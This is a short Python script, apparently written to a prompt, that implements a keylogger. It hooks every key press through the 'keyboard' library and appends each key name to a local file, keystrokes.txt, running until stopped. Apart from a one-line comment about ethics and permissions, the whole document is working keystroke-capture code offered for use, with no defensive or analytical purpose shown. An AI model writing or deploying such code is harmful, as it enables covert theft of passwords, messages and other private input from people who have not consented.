# Create a basic keylogger program that records and logs keystrokes. 
# Focus on logging the keys pressed and saving them to a file. 
# Note: Ethical considerations and permissions are crucial for projects involving keyloggers.

import keyboard

log_file = "keystrokes.txt"


def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

keyboard.on_press(on_key_press)

keyboard.wait()